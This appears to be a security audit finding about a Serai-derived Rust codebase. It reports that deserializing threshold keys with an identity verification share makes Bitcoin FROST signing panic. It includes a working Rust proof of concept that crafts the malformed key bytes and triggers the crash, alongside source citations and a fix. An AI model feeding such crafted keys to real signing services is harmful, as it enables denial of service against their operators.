### Title
Malformed serialized threshold keys trigger a panic during Bitcoin signing - ([File: crypto/dkg/src/lib.rs](https://github.com/Annirich/serai--017/blob/017/crypto/dkg/src/lib.rs))

### Summary
`ThresholdKeys::read` accepts a canonically encoded identity point as a verification share and constructs a `ThresholdKeys` whose group key is the point at infinity. When those keys are used with Bitcoin’s BIP-340 FROST algorithm, `Hram::hram` unconditionally extracts the x-coordinate of the group key and panics because infinity has no x-coordinate. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
`ThresholdKeys::read` parses arbitrary serialized key material and calls `C::read_G` for each verification share. This is the generic `Ciphersuite::read_G`, which checks only that the point is valid and canonically encoded; it does not reject the identity point. [4](#0-3) [5](#0-4) 

`ThresholdKeys::new` then derives the group key from the supplied verification shares without rejecting an identity result or checking that the supplied secret share matches the caller’s verification share. For a one-of-one key with an identity verification share, deserialization therefore succeeds with `group_key() == identity`. [6](#0-5) [7](#0-6) 

Bitcoin’s `Hram` implementation converts both the aggregate nonce `R` and group key `A` to compressed SEC1 encodings and unwraps their x-coordinates. The internal `x` helper explicitly panics on the point at infinity. [8](#0-7) [3](#0-2) 

FROST reaches this panic through `AlgorithmSignMachine::sign`, which calls `sign_share`; Bitcoin’s implementation delegates to `FrostSchnorr::sign_share`, which calls `H::hram(&nonce_sums[0][0], &params.group_key(), msg)`. [9](#0-8) [10](#0-9) [11](#0-10) 

### Impact Explanation
An attacker who can supply serialized threshold-key material to an application can cause a deterministic panic the first time that application uses the resulting key in a Bitcoin signing session. This prevents that signing operation and can terminate the caller’s process if the panic is not isolated. [12](#0-11) [2](#0-1) 

### Likelihood Explanation
The trigger requires the application to accept attacker-controlled bytes through `ThresholdKeys::read` and later use them for signing. Applications that restore threshold keys only from trusted local storage are not exposed, but applications accepting key material from peers, clients, recovery flows, or untrusted backup/configuration inputs are exposed. Once accepted, the panic is deterministic rather than probabilistic. [12](#0-11) [13](#0-12) 

### Recommendation
Reject identity verification shares and an identity derived `group_key` in `ThresholdKeys::new` or `ThresholdKeys::read`. Also verify `C::generator() * secret_share == verification_shares[params.i()]` when deserializing a complete secret-bearing `ThresholdKeys`, so semantically inconsistent key blobs are rejected before use. [14](#0-13) [15](#0-14) 

### Proof of Concept
The following creates a syntactically valid but semantically invalid serialized one-of-one `ThresholdKeys` object whose verification share is the canonical identity point. Deserialization succeeds, and signing then panics inside `x`:

```rust
use std::collections::HashMap;

use rand_core::OsRng;
use zeroize::Zeroizing;

use ciphersuite::{
  group::{ff::{Field, PrimeField}, Group, GroupEncoding},
  Ciphersuite,
};
use frost::{
  curve::Secp256k1,
  ThresholdKeys,
  sign::{AlgorithmMachine, PreprocessMachine, SignMachine},
};
use bitcoin_serai::crypto::Schnorr;

let mut encoded = Vec::new();

// ThresholdKeys serialization header.
encoded.extend(
  u32::try_from(Secp256k1::ID.len()).unwrap().to_le_bytes()
);
encoded.extend(Secp256k1::ID);

// t = 1, n = 1, participant = 1.
encoded.extend(1u16.to_le_bytes());
encoded.extend(1u16.to_le_bytes());
encoded.extend(1u16.to_le_bytes());

// Interpolation::Lagrange.
encoded.push(1);

// Secret share = 1.
encoded.extend(
  <Secp256k1 as Ciphersuite>::F::ONE.to_repr().as_ref()
);

// Verification share = identity. Ciphersuite::read_G accepts this
// canonical encoding; ThresholdKeys::read does not reject it.
encoded.extend(
  <Secp256k1 as Ciphersuite>::G::identity().to_bytes().as_ref()
);

let keys =
  ThresholdKeys::<Secp256k1>::read(&mut encoded.as_slice()).unwrap();
assert!(bool::from(keys.group_key().is_identity()));

let (machine, _preprocess) =
  AlgorithmMachine::new(Schnorr::new(), keys).preprocess(&mut OsRng);

// Panics in bitcoin-serai::crypto::x when formatting the identity
// group key as an x-only BIP-340 key.
let _ = machine.sign(HashMap::new(), b"");
```

The resulting panic is `x`’s `expect("point at infinity")`, reached through `Schnorr::sign_share` and `Hram::hram`. [2](#0-1) [10](#0-9)

### Citations

**File:** crypto/dkg/src/lib.rs (L347-390)
```rust
impl<C: Ciphersuite> ThresholdKeys<C> {
  /// Create a new set of ThresholdKeys.
  pub fn new(
    params: ThresholdParams,
    interpolation: Interpolation<C::F>,
    secret_share: Zeroizing<C::F>,
    verification_shares: HashMap<Participant, C::G>,
  ) -> Result<ThresholdKeys<C>, DkgError> {
    if verification_shares.len() != usize::from(params.n()) {
      Err(DkgError::IncorrectAmountOfVerificationShares {
        n: params.n(),
        shares: verification_shares.len(),
      })?;
    }
    for participant in verification_shares.keys().copied() {
      if u16::from(participant) > params.n() {
        Err(DkgError::InvalidParticipant { n: params.n(), participant })?;
      }
    }

    match &interpolation {
      Interpolation::Constant(_) => {
        if params.t() != params.n() {
          Err(DkgError::InapplicableInterpolation("constant interpolation for keys where t != n"))?;
        }
      }
      Interpolation::Lagrange => {}
    }

    let t = (1 ..= params.t()).map(Participant).collect::<Vec<_>>();
    let group_key =
      t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum();

    Ok(ThresholdKeys {
      core: Arc::new(Zeroizing::new(ThresholdCore {
        params,
        interpolation,
        secret_share,
        group_key,
        verification_shares,
      })),
      scalar: C::F::ONE,
      offset: C::F::ZERO,
    })
```

**File:** crypto/dkg/src/lib.rs (L445-447)
```rust
  pub fn group_key(&self) -> C::G {
    (self.core.group_key * self.scalar) + (C::generator() * self.offset)
  }
```

**File:** crypto/dkg/src/lib.rs (L574-631)
```rust
  pub fn read<R: io::Read>(reader: &mut R) -> io::Result<ThresholdKeys<C>> {
    {
      let different = || io::Error::other("deserializing ThresholdKeys for another curve");

      let mut id_len = [0; 4];
      reader.read_exact(&mut id_len)?;
      if u32::try_from(C::ID.len()).unwrap().to_le_bytes() != id_len {
        Err(different())?;
      }

      let mut id = vec![0; C::ID.len()];
      reader.read_exact(&mut id)?;
      if id != C::ID {
        Err(different())?;
      }
    }

    let (t, n, i) = {
      let mut read_u16 = || -> io::Result<u16> {
        let mut value = [0; 2];
        reader.read_exact(&mut value)?;
        Ok(u16::from_le_bytes(value))
      };
      (
        read_u16()?,
        read_u16()?,
        Participant::new(read_u16()?).ok_or(io::Error::other("invalid participant index"))?,
      )
    };

    let mut interpolation = [0];
    reader.read_exact(&mut interpolation)?;
    let interpolation = match interpolation[0] {
      0 => Interpolation::Constant({
        let mut res = Vec::with_capacity(usize::from(n));
        for _ in 0 .. n {
          res.push(C::read_F(reader)?);
        }
        res
      }),
      1 => Interpolation::Lagrange,
      _ => Err(io::Error::other("invalid interpolation method"))?,
    };

    let secret_share = Zeroizing::new(C::read_F(reader)?);

    let mut verification_shares = HashMap::new();
    for l in (1 ..= n).map(Participant) {
      verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
    }

    ThresholdKeys::new(
      ThresholdParams::new(t, n, i).map_err(io::Error::other)?,
      interpolation,
      secret_share,
      verification_shares,
    )
    .map_err(io::Error::other)
```

**File:** networks/bitcoin/src/crypto.rs (L13-22)
```rust
fn x(key: &ProjectivePoint) -> [u8; 32] {
  let encoded = key.to_encoded_point(true);
  (*encoded.x().expect("point at infinity")).into()
}

/// Convert a non-infinity point to a XOnlyPublicKey (dropping its sign).
///
/// Panics on invalid input.
pub(crate) fn x_only(key: &ProjectivePoint) -> XOnlyPublicKey {
  XOnlyPublicKey::from_slice(&x(key)).expect("x_only was passed a point which was infinity or odd")
```

**File:** networks/bitcoin/src/crypto.rs (L59-73)
```rust
    fn hram(R: &ProjectivePoint, A: &ProjectivePoint, m: &[u8]) -> Scalar {
      const TAG_HASH: Sha256 = Sha256::const_hash(b"BIP0340/challenge");

      let mut data = Sha256::engine();
      data.input(TAG_HASH.as_ref());
      data.input(TAG_HASH.as_ref());
      data.input(&x(R));
      data.input(&x(A));
      data.input(m);

      let c = Scalar::reduce(U256::from_be_slice(Sha256::from_engine(data).as_ref()));
      // If the nonce was odd, sign `r - cx` instead of `r + cx`, allowing us to negate `s` at the
      // end to sign as `-r + cx`
      <_>::conditional_select(&c, &-c, needs_negation(R))
    }
```

**File:** networks/bitcoin/src/crypto.rs (L128-136)
```rust
    fn sign_share(
      &mut self,
      params: &ThresholdView<Secp256k1>,
      nonce_sums: &[Vec<<Secp256k1 as Ciphersuite>::G>],
      nonces: Vec<Zeroizing<<Secp256k1 as Ciphersuite>::F>>,
      msg: &[u8],
    ) -> <Secp256k1 as Ciphersuite>::F {
      self.0.sign_share(params, nonce_sums, nonces, msg)
    }
```

**File:** crypto/ciphersuite/src/lib.rs (L91-100)
```rust
  fn read_G<R: Read>(reader: &mut R) -> io::Result<Self::G> {
    let mut encoding = <Self::G as GroupEncoding>::Repr::default();
    reader.read_exact(encoding.as_mut())?;

    let point = Option::<Self::G>::from(Self::G::from_bytes(&encoding))
      .ok_or_else(|| io::Error::other("invalid point"))?;
    if point.to_bytes().as_ref() != encoding.as_ref() {
      Err(io::Error::other("non-canonical point"))?;
    }
    Ok(point)
```

**File:** crypto/frost/src/sign.rs (L382-398)
```rust
    #[allow(non_snake_case)]
    let Rs = B.nonces(&nonces);

    let our_binding_factors = B.binding_factors(multisig_params.i());
    let nonces = self
      .nonces
      .drain(..)
      .enumerate()
      .map(|(n, nonces)| {
        let [base, mut actual] = nonces.0;
        *actual *= our_binding_factors[n];
        *actual += base.deref();
        actual
      })
      .collect::<Vec<_>>();

    let share = self.params.algorithm.sign_share(&view, &Rs, nonces, msg);
```

**File:** crypto/frost/src/algorithm.rs (L201-210)
```rust
  fn sign_share(
    &mut self,
    params: &ThresholdView<C>,
    nonce_sums: &[Vec<C::G>],
    mut nonces: Vec<Zeroizing<C::F>>,
    msg: &[u8],
  ) -> C::F {
    let c = H::hram(&nonce_sums[0][0], &params.group_key(), msg);
    self.c = Some(c);
    SchnorrSignature::<C>::sign(params.secret_share(), nonces.swap_remove(0), c).s
```
